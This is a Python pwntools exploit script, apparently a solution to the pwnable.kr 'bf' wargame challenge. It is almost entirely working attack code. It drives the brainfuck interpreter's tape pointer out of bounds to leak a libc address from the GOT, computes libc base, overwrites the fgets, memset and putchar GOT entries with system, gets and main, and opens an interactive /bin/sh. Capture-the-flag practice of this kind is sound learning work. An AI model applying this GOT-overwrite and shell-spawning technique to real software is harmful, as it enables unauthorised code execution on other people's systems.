from pwn import *


if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote("pwnable.kr", 9001)
    libc_start_main_offset = 0x00018540
    system_offset = 0x0003a920
    gets_offset = 0x0005e770

else:
    p = process("./bf")
    system_offset = 0x0003ada0
    gets_offset = 0x0005f3e0
    libc_start_main_offset = 0x00018540

    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
        gdb.attach(p, """
              set disassembly-flavor intel
               b *0x804865A
               b *0x8048648
               b main
               """)

main_addr = p32(0x8048671)

# leak libc
p.recvuntil("[ ]")
payload = "<"*0x79+ "." + "<." + "<." + "<." # leak address of libc_start_main in got
payload = payload + ">"*12 + "," + ">,"*3 + "." # overwrites putchar with main, calls main

p.sendline(payload)
p.send(main_addr)

putchar_offset = 0x70
p.recvline()
leak = p.recvline()
leak = u32(leak[:4], endian="big")
print "leak", hex(leak)
libc_base = leak - libc_start_main_offset
print "libc_base", hex(libc_base)
system_addr = libc_base + system_offset
gets_addr = libc_base + gets_offset
print "system addr", hex(system_addr)
print "gets_addr", hex(gets_addr)

# stage 2, reenter main and exploit
print p.recvline()
payload2 = "<"*0x90 + "," + ">,"*3 # overwrites fgets with system
payload2 += ">"*25 + "," + ">,"*3 # overwrites memset with gets
payload2 += ">,"*4 + "." # overwrites putchar with main, calls main
p.sendline(payload2)
p.send(p32(system_addr) + p32(gets_addr) + main_addr)
p.sendline("/bin/sh\x00")
p.interactive()




